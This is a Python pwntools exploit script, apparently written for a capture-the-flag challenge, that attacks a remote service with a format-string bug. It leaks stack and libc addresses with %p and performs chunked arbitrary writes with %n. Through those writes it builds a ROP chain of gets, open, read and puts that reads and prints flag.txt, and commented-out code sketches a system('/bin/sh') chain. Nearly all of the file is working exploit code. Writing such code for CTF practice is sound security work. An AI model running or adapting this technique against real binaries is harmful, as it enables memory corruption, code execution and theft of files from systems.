#!/bin/env python3
print('starting')
from pwn import *
context.arch = 'amd64'
#context.log_level = 'critical'
host = 'challs.xmas.htsp.ro'
port = 12003

#binary = ELF('./main')
p=remote(host,port)
#p = process('./main')


p.recvline().decode('utf-8')
p.sendline(b'Junk')
p.recvline().decode('utf-8')
p.recvline().decode('utf-8')
p.recvline().decode('utf-8')


def fmt_str(write):
    p.sendline(write)
    return p.recvline().decode('utf-8').strip('\n').split(' ')[-1]


# a function that writes data to specified address
# dont use this directly writing large values on stack will take too much time
def raw_writer(what, where):
    address = p64(where)
    #print(address)
    
    
    # code to write large values to the stack
    value = str(int(what, 16))
    lval = len(value)
    padding = b'A'*(16 - lval - 5 - 2)
    print(len(padding),end='')
    value = str(int(value) - len(padding))
    
    # just some stupid edge cases
    expad = ""
    while len(value+expad) != lval and lval >50:
        expad += 'x'
        value = str(int(value) - 1)

    value = str(value+expad).encode()

    format_string = padding + b"%" + value + b"x" b'%8$n ' + address 


	# code to write smaller values like 0, 1, 10 to target
    if int(what,16) < 50:
        #print('altwrt')
        value = int(what,16)
        padding = b'B' * value
        padder = b'C' * (16-5-len(padding))
        format_string = padding + b'%8$n ' + padder + address 
    

    bad_check(address)
    format_string += b'\n'

    #input('send payload ??')
    p.sendline(format_string)
    return p.recvline()


# Writes large data to specified address using lots of small writes
# this makes it faster and stable
def write(what, where):
    val2wrt = what[2:]
    while len(val2wrt) % 4 != 0:
        val2wrt = '0' + val2wrt
    values = []
    for x in range(len(val2wrt)//4):
        values.append(val2wrt[4*x: 4*x+4])
    values = values[::-1]

    offsets = list(range(len(values)))
    

    # print(offsets)
    # print(values)
    for x in range(len(values)):
        # print('0x'+values[x])
        # print(where+x)
        raw_writer('0x'+values[x], where+2*offsets[x])


# determine the address of return pointer
address_return_pointer = int(fmt_str('%30$p'), 16)   - 0x10 #0x31                       # suspecious need more attention
arp = address_return_pointer
log.success('Address or return pointer: ' + hex(arp))
################### Writable area in memory ########
writable_buffer = int(fmt_str('%30$p'), 16) - 0x128
buff = hex(writable_buffer)



################ check for bad characters ################
def bad_check(sym):
    try:                    # Byte string conversion
        sym = p64(int(sym,16))
    except:
        pass
    if b'\n' in sym:
        print(' Bad Char detected : quitting')
        #print(sym)
        exit()




###############################################################################
#################################### LIBC STUFF ###############################
###############################################################################

# Leaking libc base address
base = int(fmt_str('%41$p'), 16)
lba = base - 0x21b97    #0x27153                                                            # suspecious need more attention
log.success('Libc base address: ' + hex(lba))

# Load Libc
#libc = ELF('/lib/libc-2.30.so')
libc=ELF('./libc-2.27.so')


# Symbol search for libc
def get_sym(symbol):
    p_sym = hex(libc.symbols[symbol] + lba)
    bad_check(p_sym)
    return hex(libc.symbols[symbol] + lba)


# Gagets search for libc
def get_gadget(snip):
    p_sym = hex(next(libc.search(asm(snip))) + lba)
    bad_check(p_sym)
    return hex(next(libc.search(asm(snip))) + lba)


# Strings
bin_sh = hex(lba + next(libc.search(b'/bin/sh')))

############ symbol s#######
system = get_sym('system')
opn = get_sym('open')
read = get_sym('read')
puts = get_sym('puts')
gets = get_sym('gets')
printf = get_sym('printf')


############ gadgets ######
pop_rdi = get_gadget('pop rdi; ret')
pop_rsi = get_gadget('pop rsi; ret')
pop_rdx_pop_rbx = get_gadget('pop rdx;pop rbx;ret')
ret = get_gadget('ret')
###############################################################################
###############################################################################


# input('exploit ?')
# ask for the path to flag file
write(pop_rdi, arp); arp +=8
write(buff, arp); arp +=8
write(gets, arp); arp +=8

#puts
#write(pop_rdi, arp); arp +=8
#write(buff, arp); arp +=8
#write(puts, arp); arp +=8
#write(pop_rdi, arp); arp +=8
#write(buff, arp); arp +=8
#write(puts, arp); arp +=8


#open
write(pop_rdi, arp); arp +=8
write(buff, arp); arp +=8
write(pop_rsi, arp); arp +=8
write('0x0000000000000000', arp); arp+=8
write(opn, arp); arp +=8

#read
write(pop_rdi, arp); arp +=8
write('0x0000000000000003', arp); arp+=8
write(pop_rsi, arp); arp +=8
write(buff, arp); arp +=8
write(pop_rdx_pop_rbx, arp); arp +=8
# write(pop_rdx, arp); arp +=8
write('0x0000000000000123', arp); arp+=8
write('0x0000000000000003', arp); arp+=8
write(read, arp); arp +=8

#puts
write(pop_rdi, arp); arp +=8
write(buff, arp); arp +=8
write(puts, arp); arp +=8

write(pop_rdi, arp); arp +=8
write(buff, arp); arp +=8
write(puts, arp); arp +=8



# print(hex(system))
# print(hex(bin_sh))
# print(hex(pop_rdi))
#
# write(hex(puts), address_return_pointer+16)
# # write(hex(bin_sh), address_return_pointer+24)
# write(hex(bin_sh), address_return_pointer+8)
# write(hex(pop_rdi), address_return_pointer)
# # write(hex(ret), address_return_pointer)
#
# print(hex(address_return_pointer))
p.sendline(b'end of letter')
print(p.recvline())
p.sendline(b'flag.txt')


print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())

